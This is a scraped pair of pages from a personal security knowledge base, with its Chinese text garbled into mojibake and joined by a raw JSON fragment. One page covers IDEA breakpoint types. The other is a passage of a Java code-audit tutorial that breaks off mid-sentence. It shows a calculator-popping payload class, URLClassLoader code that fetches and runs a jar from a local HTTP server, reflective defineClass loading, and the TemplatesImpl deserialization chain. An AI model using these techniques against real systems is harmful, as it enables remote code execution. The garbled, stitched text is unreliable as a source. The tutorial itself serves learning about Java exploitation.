æ­¤äº†è§£æ–­ç‚¹åˆ†ç±»ã€è°ƒè¯•æŠ€å·§å°±æ˜¾å¾—æœ‰ç‚¹å¿…é¡»äº† æ®Šä¸çŸ¥ï¼ŒIDEAç»™æˆ‘ä»¬æä¾›äº†ä¸°å¯Œçš„æ–­ç‚¹ç±»å‹ï¼Œè®©æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸åŒçš„è°ƒè¯•åœºæ™¯ä¸‹ï¼Œä½¿ç”¨ä¸åŒçš„æ–­ç‚¹ç±»å‹æ¥å¤§å¤§æé«˜æˆ‘ä»¬çš„è°ƒè¯•æ•ˆç‡ï¼Œæ¯•ç«Ÿæ•ˆç‡å°±æ˜¯æ—¶é—´ï¼Œè€Œæ—¶é—´å°±æ˜¯ç”Ÿå‘½ã€‚ ä»ideaæ–­ç‚¹å¯¹è¯æ¡†é‡Œä¹Ÿèƒ½å¤Ÿçœ‹å‡ºæ–­ç‚¹æ˜¯åˆ†ç±»çš„ã€‚ç„¶åä¸‹é¢æˆ‘å¯¹æ–­ç‚¹çš„åˆ†ç±»è®²è§£ä¸æ˜¯å®Œå…¨æŒ‰æ­¤åˆ†ç±»ï¼Œæˆ‘çš„åˆ†ç±»ä¼šæ›´åŠ è¯¦ç»†å¦‚ä¸‹ï¼š Line breakpointï¼ˆè¡Œæ–­ç‚¹ï¼‰ï¼šåœ¨æŒ‡å®šä»£ç è¡Œè®¾ç½®æ–­ç‚¹ï¼Œå±äºè¡Œçº§åˆ«çš„æ–­ç‚¹ Temporary line breakpointï¼ˆä¸´æ—¶è¡Œæ–­ç‚¹ï¼‰ï¼šä¸è¡Œæ–­ç‚¹ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºè¯¥ç±»å‹çš„æ–­ç‚¹åœ¨è¢«æ¿€æ´»ä¹‹åä¼šè¢«ç«‹å³åˆ é™¤ Field watchpointï¼ˆå±æ€§æ–­ç‚¹ï¼‰ï¼šè¯»å–æˆ–è€…ä¿®æ”¹å±æ€§æ—¶ä¼šæ¿€æ´»å±æ€§æ–­ç‚¹ Method breakpointï¼ˆæ–¹æ³•æ–­ç‚¹ï¼‰ï¼šå®ƒæ˜¯æ ‡è®°åœ¨æ–¹æ³•é‚£ä¸€è¡Œçš„æ–­ç‚¹ï¼Œæœ‰è‡ªå·±ç‰¹æœ‰çš„å±æ€§å‚æ•° Exception breakpointï¼ˆå¼‚å¸¸æ–­ç‚¹ï¼‰ï¼šå½“ç¨‹åºæŠ›å‡ºæŒ‡å®šå¼‚å¸¸æ—¶ä¼šæ¿€æ´»å¼‚å¸¸æ–­ç‚¹ã€‚ä¸è¡Œæ–­ç‚¹ä¸åŒï¼Œå¼‚å¸¸æ–­ç‚¹ä¸éœ€è¦ä¸æºä»£ç æ˜ å°„ï¼ˆä¸éœ€è¦æ‰“åœ¨å…·ä½“æŸä¸€è¡Œä»£ç ä¸Šï¼‰ï¼Œå› ä¸ºå¼‚å¸¸æ–­ç‚¹åº”ç”¨ç¨‹åºçº§åˆ«çš„ Line breakpointï¼ˆè¡Œæ–­ç‚¹ï¼‰ è¿™æ˜¯ä½¿ç”¨å¾—æœ€ä¸ºå¹¿æ³›çš„ä¸€ç§æ–­ç‚¹ã€‚ç¤ºä¾‹æ“ä½œâ€œè§†é¢‘â€œï¼š æ–­ç‚¹å‚æ•° ä½œä¸ºç¬¬ä¸€ä¸ªä»‹ç»çš„æ–­ç‚¹ç±»å‹ï¼Œè¿™é‡Œæœ‰å¿…è¦å…¨é¢çš„è§£é‡Šä¸€ä¸‹ä¸Šé¢è¡Œæ–­ç‚¹æ“ä½œçš„æ–­ç‚¹å‚æ•°ï¼š Suspendï¼šæœ‰æ²¡æœ‰è®©ä½ è¯§å¼‚åˆ°ï¼Œå®ƒç«Ÿç„¶æ˜¯ä¸ªå¤é€‰æ¡†å¹¶ä¸”è¿˜å¯ä»¥ä¸è¢«é€‰ä¸­ã€‚è‹¥å®ƒä¸è¢«é€‰ä¸­çš„è¯æ–­ç‚¹çš„ç›¸å…³åŠ¨ä½œä¾ç„¶æ¿€æ´»æ‰§è¡Œï¼Œåªæ˜¯çº¿ç¨‹ä¸ä¼šè¢«ç»„å¡äº†è€Œå·²ã€‚å®ƒçš„ä¸¤ç§é˜»å¡ç­–ç•¥å¦‚ä¸‹ï¼š Allï¼šé˜»å¡è¯¥ç¨‹åºå†…æ‰€æœ‰çº¿ç¨‹ï¼ˆé»˜è®¤ï¼‰ Threadï¼šåªé˜»å¡å½“å‰æ–­ç‚¹æ‰€åœ¨çº¿ç¨‹ï¼ˆåœ¨å¤šçº¿ç¨‹è°ƒè¯•ã€è¿œç¨‹è°ƒè¯•ä¸­å¼ºçƒˆå»ºè®®ä½¿ç”¨è¿™ç§æ–¹å¼ï¼‰ Conditionï¼šè¿™å°±æ˜¯æ‰€è°“çš„æ¡ä»¶æ–­ç‚¹ï¼Œåªæœ‰ä¹¦å†™çš„è¡¨è¾¾å¼è¿”å›trueæ—¶å€™æ–­ç‚¹æ‰ä¼šè¢«æ¿€æ´» Logï¼š å‹¾é€‰\"Breakpoint hit message\"ï¼šæ–­ç‚¹æ¿€æ´»æ—¶è¾“å‡ºæç¤ºæ—¥å¿— å‹¾é€‰\"Stack trace\"ï¼šæ–­ç‚¹æ¿€æ´»æ—¶è¾“å‡ºç¨‹åºè°ƒç”¨æ ˆä¿¡æ¯ å‹¾é€‰\"Evaluate and log\"ï¼šå¹¶åœ¨ä¸‹é¢çš„è¾“å…¥æ¡†ä¸­è¾“å…¥\"args\"ï¼Œæ–­ç‚¹æ¿€æ´»æ—¶ä¼šè®¡ç®—å¹¶è¾“å‡ºå˜é‡ args çš„å€¼ å¯ä»¥åŒæ—¶é€‰ä¸­ Temporary line breakpointï¼ˆä¸´æ—¶è¡Œæ–­ç‚¹ï¼‰ åˆ›å»ºæ–¹æ³•ä¸è¯´äº†ï¼ŒåŒä¸Šã€‚å’Œä¸Šé¢çš„å”¯ä¸€åŒºåˆ«æ˜¯ï¼šæŠŠRemove once hitè¿™ä¸ªå¤é€‰æ¡†ç»™å‹¾é€‰ä¸Šï¼ˆæ­¤ç±»å‹æ–­ç‚¹å…¶å®ä½¿ç”¨è¾ƒå°‘ï¼‰ã€‚ Field watchpointï¼ˆå±æ€§æ–­ç‚¹ï¼‰ åˆ›å»ºçš„æ–¹å¼å’Œä¸Šæ— å·®å¼‚ã€‚ï¼ˆç›®å‰å‘ç°æ˜¯é’ˆå¯¹çš„ç±»ä¸­å®šä¹‰çš„å˜é‡ï¼‰ æ–­ç‚¹å‚æ•° ç”±äºç»å¤§å¤šæ•°å‚æ•°ç¬¬ä¸€ä¸ªå·²ç»è®²è¿°äº†ï¼Œsoè¿™é‡Œåªå‰©ä¸€ä¸ªå®ƒç‹¬æœ‰çš„å‚æ•°ï¼š Watchï¼šé€‰ä¸­\"Filed Access\" è¯»å–çš„æ—¶å€™éƒ½ä¼šæ–­ä½ã€‚é€‰ä¸­\"Filed madification\"è¡¨ç¤ºä¿®æ”¹çš„æ—¶å€™éƒ½ä¼šæ–­ä½ Method breakpointï¼ˆæ–¹æ³•æ–­ç‚¹ï¼‰ æ‰“æ–­ç‚¹æ–¹å¼åŒä¸Šï¼Œåªæ˜¯å®ƒæ˜¯å¿…é¡»æŠŠæ–­ç‚¹æ‰“åœ¨æ–¹æ³•é‚£ä¸€è¡Œä¸Šã€‚ å®ƒä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±ç‹¬æœ‰çš„å‚æ•°ï¼š Watchï¼š - â€œMethod entryâ€ï¼šè¿›å…¥æ–¹æ³•æ—¶æ¿€æ´»æ–­ç‚¹ - â€œMethod exitâ€ï¼šå‡ºå»æ–¹æ³•æ—¶æ¿€æ´»æ–­ç‚¹ - â€œEmulatedâ€ï¼šç›®å‰å‘ç°æ²¡å•¥åµç”¨ï¼ˆæ±‚å°ä¼™ä¼´ä¸è¦å–·æˆ‘~ï¼‰ Exception breakpointï¼ˆå¼‚å¸¸æ–­ç‚¹ï¼‰ å¼‚å¸¸æ–­ç‚¹å±äºéå¸¸ç‰¹æ®Šçš„ä¸€ç§æ–­ç‚¹ç±»å‹ï¼Œå®ƒä¸å¯¹åº”ä»»ä½•ä¸€è¡Œä»£ç ï¼Œå› ä¸ºå®ƒå±äºç¨‹åºçº§åˆ«çš„æ–­ç‚¹ã€‚ å®ƒä¸èƒ½åƒä¸Šé¢åœ¨ä»£ç å¤„ç›´æ¥åˆ›å»ºï¼Œåªèƒ½é€šè¿‡ä¸Šé¢çš„æ–­ç‚¹å¯¹è¯æ¡†æ¥åˆ›å»ºã€‚ æ­¤å¤„æ³¨æ„ï¼šå¼‚å¸¸æ–­ç‚¹ä¸­å¾ˆå¤šé€‰é¡¹å°±æ˜¯ä¸èƒ½ä½¿ç”¨çš„ï¼ˆç°è‰²ï¼‰å¦‚ä¸‹å›¾ç¤ºï¼š æ–­ç‚¹å‚æ•° ä½†æ˜¯åŒç†ï¼Œå®ƒä¹Ÿæä¾›ä¸€ä¸ªç‰¹æœ‰çš„æ–­ç‚¹å‚æ•°ï¼š Notificationï¼š - â€œCatch excetionâ€ï¼šç¨‹åºåœ¨æ•è·ï¼ˆTry Catchï¼‰è¿™ä¸ªå¼‚å¸¸æ—¶æ¿€æ´»æ–­ç‚¹ - â€œUncatch excetionâ€ï¼šä¸catchæ•è·å¼‚å¸¸æ—¶æ¿€æ´»æ–­ç‚¹ å°ç»†èŠ‚ï¼šå¯¹äºä¸åŒç±»å‹çš„æ–­ç‚¹ï¼Œæ‰“æ¡©åæˆ‘ä»¬çœ‹åˆ°çš„å›¾æ ‡ä¹Ÿæ˜¯æœ‰å·®å¼‚çš„ï¼Œå¦‚å›¾ï¼š æ¡ä»¶æ–­ç‚¹ å°±æ˜¯æ–­ç‚¹åœ¨æ»¡è¶³æ¡ä»¶çš„æ—¶å€™æ‰ä¼šé˜»å¡ï¼Œä¸è¿‡ä¸€èˆ¬ä¹Ÿåªèƒ½ä¹¦å†™ä¸€äº›è¾ƒç®€å•çš„åˆ¤å®š Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/07.JavaåŠ è½½å­—èŠ‚ç .html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/07.JavaåŠ è½½å­—èŠ‚ç .html","title":"07.JavaåŠ è½½å­—èŠ‚ç ","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 ç®€ä»‹ ä»€ä¹ˆæ˜¯Javaå­—èŠ‚ç  JAVAç¨‹åºçš„è¿è¡Œ å­—èŠ‚ç å¦‚ä½•äº§ç”Ÿ å¦‚ä½•çœ‹æ‡‚å­—èŠ‚ç  åŠ è½½å­—èŠ‚ç  åˆ©ç”¨URLClassLoaderåŠ è½½è¿œç¨‹classæ–‡ä»¶ åˆ©ç”¨ClassLoader#defineClassåŠ è½½å­—èŠ‚ç  åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç  åˆ©ç”¨Unsafe#defineClassåŠ è½½å­—èŠ‚ç  åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç  å‚è€ƒ ç®€ä»‹ ä»€ä¹ˆæ˜¯Javaå­—èŠ‚ç  å®ƒæ˜¯ç¨‹åºçš„ä¸€ç§ä½çº§è¡¨ç¤ºï¼Œå¯ä»¥è¿è¡ŒäºJavaè™šæ‹Ÿæœºä¸Šã€‚å°†ç¨‹åºæŠ½è±¡æˆå­—èŠ‚ç å¯ä»¥ä¿è¯Javaç¨‹åºåœ¨å„ç§è®¾å¤‡ä¸Šçš„è¿è¡Œ Javaå·ç§°æ˜¯ä¸€é—¨â€œä¸€æ¬¡ç¼–è¯‘åˆ°å¤„è¿è¡Œâ€çš„è¯­è¨€ï¼Œä»æˆ‘ä»¬å†™çš„javaæ–‡ä»¶åˆ°é€šè¿‡ç¼–è¯‘å™¨ç¼–è¯‘æˆjavaå­—èŠ‚ç æ–‡ä»¶ï¼ˆ.classæ–‡ä»¶ï¼‰ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯javaç¼–è¯‘è¿‡ç¨‹ï¼›è€Œæˆ‘ä»¬çš„javaè™šæ‹Ÿæœºæ‰§è¡Œçš„å°±æ˜¯å­—èŠ‚ç æ–‡ä»¶ã€‚ä¸è®ºè¯¥å­—èŠ‚ç æ–‡ä»¶æ¥è‡ªä½•æ–¹ï¼Œç”±å“ªç§ç¼–è¯‘å™¨ç¼–è¯‘ï¼Œç”šè‡³æ˜¯æ‰‹å†™å­—èŠ‚ç æ–‡ä»¶ï¼Œåªè¦ç¬¦åˆjavaè™šæ‹Ÿæœºçš„è§„èŒƒï¼Œé‚£ä¹ˆå®ƒå°±èƒ½å¤Ÿæ‰§è¡Œè¯¥å­—èŠ‚ç æ–‡ä»¶ã€‚ JAVAç¨‹åºçš„è¿è¡Œ å› ä¸ºJavaå…·æœ‰è·¨å¹³å°ç‰¹æ€§ï¼Œä¸ºäº†å®ç°è¿™ä¸ªç‰¹æ€§ï¼ŒJavaæ‰§è¡Œåœ¨ä¸€å°è™šæ‹Ÿæœºä¸Šï¼Œè¿™å°è™šæ‹Ÿæœºå°±æ˜¯JVMï¼ŒJavaé€šè¿‡JVMå±è”½äº†ä¸åŒå¹³å°ä¹‹é—´çš„å·®å¼‚ï¼Œä»è€Œåšåˆ°ä¸€æ¬¡ç¼–è¯‘åˆ°å¤„æ‰§è¡Œã€‚ JVMä½äºJavaç¼–è¯‘å™¨å’ŒOSå¹³å°ä¹‹é—´ï¼ŒJavaç¼–è¯‘å™¨åªéœ€é¢å‘JVMï¼Œç”ŸæˆJVMèƒ½ç†è§£çš„ä»£ç ï¼Œè¿™ä¸ªä»£ç å³å­—èŠ‚ç ï¼ŒJVMå†å°†å­—èŠ‚ç ç¿»è¯‘æˆçœŸå®æœºå™¨æ‰€èƒ½ç†è§£çš„äºŒè¿›åˆ¶æœºå™¨ç ã€‚ å­—èŠ‚ç å¦‚ä½•äº§ç”Ÿ æˆ‘ä»¬ç¼–å†™çš„ä»£ç æ–‡ä»¶é€šå¸¸æ˜¯ä»¥.javaä½œä¸ºç»“å°¾çš„ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡javacå‘½ä»¤å°†javaæ–‡ä»¶ç¼–è¯‘ä¸º.classæ–‡ä»¶ï¼Œè¿™ä¸ª.classæ–‡ä»¶å°±æ˜¯å­—èŠ‚ç æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¿è¡ŒIDEï¼Œè®©å…¶è‡ªåŠ¨ä¸ºæˆ‘ä»¬ç¼–è¯‘ å¦‚ä½•çœ‹æ‡‚å­—èŠ‚ç  å¯ä»¥å‚è€ƒæ–‡ç« ï¼šæ·±å…¥ç†è§£JVM-è¯»æ‡‚javaå­—èŠ‚ç  åŠ è½½å­—èŠ‚ç  é€šå¸¸æˆ‘ä»¬æ˜¯ç¼–å†™å¥½javaä»£ç ç„¶åideå¸®æˆ‘ä»¬è‡ªåŠ¨ç¼–è¯‘æˆclasså­—èŠ‚ç æ–‡ä»¶å†åŠ è½½åˆ°jvmä¸­è¿è¡Œçš„ï¼Œé‚£å¦‚æœæˆ‘ä»¬æƒ³è‡ªå·±åŠ è½½classæ–‡ä»¶ï¼Œæœ‰å“ªäº›åŠæ³•å‘¢ï¼Ÿ åç»­åˆ©ç”¨åˆ°çš„æ¼”ç¤ºæ¶æ„ä»£ç å¦‚ä¸‹ import java.io.IOException; public class Exp { public Exp() throws IOException { Runtime.getRuntime().exec(new String[]{\"open\", \"-na\", \"Calculator\"}); } } ç¼–è¯‘ä¸ºå­—èŠ‚ç  javac Exp.java åˆ©ç”¨URLClassLoaderåŠ è½½è¿œç¨‹classæ–‡ä»¶ åˆ©ç”¨ClassLoaderæ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æ˜¯æœ€åŸºç¡€çš„æ–¹æ³•ï¼ŒURLClassLoaderç»§æ‰¿è‡ªClassLoaderä¸”é‡å†™äº†findClasså‡½æ•°ï¼Œå…è®¸è¿œç¨‹åŠ è½½å­—èŠ‚ç ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„payloadæˆ–è€…webshellçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ¥åŠ è½½è¿œç¨‹çš„jaræ¥å®ç°è¿œç¨‹çš„ç±»æ–¹æ³•è°ƒç”¨ï¼ˆå½“ç„¶ï¼Œè¯¥æ–¹å¼åªé€‚åº”äºç›®æ ‡å‡ºç½‘çš„æƒ…å†µï¼‰ã€‚ æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹ sun.boot.class.pathå’Œjava.class.pathä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„java.net.URLç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š URLæœªä»¥æ–œæ /ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶ï¼ˆjaræ–‡ä»¶ä¸­ç›´æ¥åŒ…å«classæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ jar cvf Exp.jar Exp.class è¿›è¡Œæ‰“åŒ…ï¼‰ã€‚ import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadClassFile { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:8000/Exp.jar\")}); // ä¼šåŠ è½½ http://127.0.0.1:8000/Exp.jarä¸­çš„Exp.class Class exp = urlClassLoader.loadClass(\"Exp\"); // è§¦å‘æ„é€ å‡½æ•°ï¼Œå¼¹è®¡ç®—å™¨ exp.newInstance(); } } URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶ã€‚ import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadClassFile { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"file:/Users/d4m1ts/d4m1ts/java/classloader/\")}); // ä¼šåŠ è½½ /Users/d4m1ts/d4m1ts/java/classloader/Exp.class Class exp = urlClassLoader.loadClass(\"Exp\"); // è§¦å‘æ„é€ å‡½æ•°ï¼Œå¼¹è®¡ç®—å™¨ exp.newInstance(); } } URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±».classæ–‡ä»¶ã€‚ import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadClassFile { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:8000/\")}); // ä¼šåŠ è½½ http://127.0.0.1:8000/Exp.class Class exp = urlClassLoader.loadClass(\"Exp\"); // è§¦å‘æ„é€ å‡½æ•°ï¼Œå¼¹è®¡ç®—å™¨ exp.newInstance(); } } ä¸»è¦å…³æ³¨ç¬¬ä¸‰ç‚¹ï¼Œåˆ©ç”¨åŸºç¡€çš„Loaderç±»æ¥å¯»æ‰¾ç±»ï¼Œè€Œè¦åˆ©ç”¨è¿™ä¸€ç‚¹å¿…é¡»æ˜¯éfileåè®®çš„æƒ…å†µä¸‹ é™¤fileåè®®å¤–ï¼ŒJAVAé»˜è®¤æä¾›äº†å¯¹ftp,gopher,http,https,jar,mailto,netdocåè®®çš„æ”¯æŒ å› æ­¤ä½œä¸ºæ”»å‡»è€…ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç›®æ ‡Java URLClassLoaderçš„åŸºç¡€è·¯å¾„ä¸ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥åˆ©ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚ åˆ©ç”¨ClassLoader#defineClassåŠ è½½å­—èŠ‚ç  å…¶å®javaä¸ç®¡æ˜¯åŠ è½½è¿œç¨‹çš„classæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„classæˆ–è€…jaræ–‡ä»¶ï¼Œéƒ½æ˜¯è¦ç»å†ä¸‹é¢ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨çš„ï¼š loadClass: ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆåŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClassã€‚ findClass: æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå°±åƒä¸Šä¸€èŠ‚ä¸­è¯´åˆ°çš„ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ defineClassã€‚ defineClass: å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»ã€‚ ç€é‡å…³æ³¨ç¬¬ä¸‰ä¸ªæ–¹æ³•defindClassï¼Œç”±äºClassLoader#defineClassæ–¹æ³•æ˜¯protectedæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥ä»å¤–éƒ¨è¿›è¡Œè°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦å€ŸåŠ©åå°„æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚ ç”±äºClassLoader#defineClassæ–¹æ³•æ˜¯protectedæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥ä»å¤–éƒ¨è¿›è¡Œè°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦å€ŸåŠ©åå°„æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³• import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class loadClassFile { public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { byte[] classBytes = Files.readAllBytes(Paths.get(\"/Users/d4m1ts/d4m1ts/java/classloader/Exp.class\")); // é€šè¿‡åå°„è°ƒç”¨ defineClass Class clazz = ClassLoader.class; Method defineClass = clazz.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); Class exp = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Exp\", classBytes, 0, classBytes.length); // éœ€è¦æ‰‹åŠ¨å®ä¾‹åŒ–è§¦å‘æ„é€ å‡½æ•° exp.newInstance(); } } éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒClassLoader#defineClassè¿”å›çš„ç±»å¹¶ä¸ä¼šåˆå§‹åŒ–ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°åˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è°ƒç”¨è¿”å›çš„ç±»çš„æ„é€ å‡½æ•°æ‰èƒ½æ‰§è¡Œå‘½ä»¤ã€‚ åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸ºdefineClassæ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾ TemplatesImpl çš„åŸºçŸ³ã€‚ åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç  åœ¨å¤šä¸ªJavaååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œä»¥åŠfastjsonã€jacksonçš„æ¼æ´ä¸­ï¼Œéƒ½æ›¾å‡ºç°è¿‡ TemplatesImpl çš„èº«å½±ã€‚è™½ç„¶å¤§éƒ¨åˆ†ä¸Šå±‚å¼€å‘è€…ä¸ä¼šç›´æ¥ä½¿ç”¨åˆ°defineClassæ–¹æ³•ï¼ŒåŒæ—¶java.lang.ClassLoaderçš„defineClassæ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼ˆprotectedï¼‰ï¼Œå¾ˆéš¾åˆ©ç”¨ï¼Œä½†æ˜¯Javaåº•å±‚è¿˜æ˜¯æœ‰ä¸€äº›ç±»ç”¨åˆ°äº†å®ƒï¼Œè­¬å¦‚TemplatesImpl åœ¨com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»ï¼šTransletClassLoader å¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»ç»§æ‰¿äº†ClassLoaderï¼Œè€Œä¸”é‡å†™äº†defineClassæ–¹æ³•ï¼Œå¹¶ä¸”æ²¡æœ‰æ˜¾å¼åœ°å®šä¹‰æ–¹æ³•çš„ä½œç”¨åŸŸã€‚ Javaä¸­é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œå…¶ä½œç”¨åŸŸä¸ºdefaultã€‚ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„defineClassç”±å…¶çˆ¶ç±»çš„protectedç±»å‹å˜æˆäº†ä¸€ä¸ªdefaultç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«åŒä¸€ä¸ªåŒ…ä¸‹çš„ç±»è°ƒç”¨ã€‚ ç”±äºTransletClassLoaderæ˜¯defaultçš„å¯ä»¥è¢«åŒä¸€ä¸ªåŒ…ä¸‹çš„ç±»è°ƒç”¨ï¼Œæ‰€ä»¥ç”±ä¸‹å‘ä¸Šå¯»æ‰¾è¿™ä¸ªdefineClass()åœ¨TemplatesImplä¸­çš„è°ƒç”¨é“¾ ä¸€ç›´Find Usagesï¼Œæœ€ç»ˆæ‰¾åˆ°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š TemplatesImpl#getOutputProperties() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass(final byte[] b) æœ€å¤–å±‚çš„2ä¸ªæ–¹æ³•å‡æ˜¯publicä¿®é¥°çš„ï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ï¼Œä»¥TemplatesImpl#getOutputProperties()ä¸ºä¾‹ã€‚ åˆæ¬¡è§‚å¯Ÿæ•´ä¸ªé“¾ï¼Œéœ€è¦è®¾ç½®çš„å‚æ•°å¦‚ä¸‹_bytecodesï¼ˆå­—èŠ‚ç ï¼Œä¸èƒ½ä¸ºnullï¼‰ã€_nameï¼ˆä¸èƒ½ä¸ºnullï¼‰ã€_classï¼ˆéœ€è¦ä¸ºnullï¼Œè€Œé»˜è®¤æƒ…å†µä¸‹ä¹Ÿä¸ºnullï¼Œæ‰€ä»¥å¯ä»¥ä¸éœ€è¦ï¼‰ ä½†æ˜¯è¿™æ ·ä¼šæŠ›å‡ºå¼‚å¸¸NullPointerExceptionï¼Œç»è¿‡åˆ†æï¼Œå‘ç°è¿˜éœ€è¦è®¾ç½®_tfactoryå‚æ•°ï¼Œå®ƒçš„ç±»å‹ä¸ºTransformerFactoryImpl æ‰€ä»¥ä¸€å…±éœ€è¦è®¾ç½®3ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯_bytecodesã€_nameã€_tfactory é€šè¿‡ä¸‹æ–¹å®ä¾‹åŒ–çš„ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºè¿œç¨‹åŠ 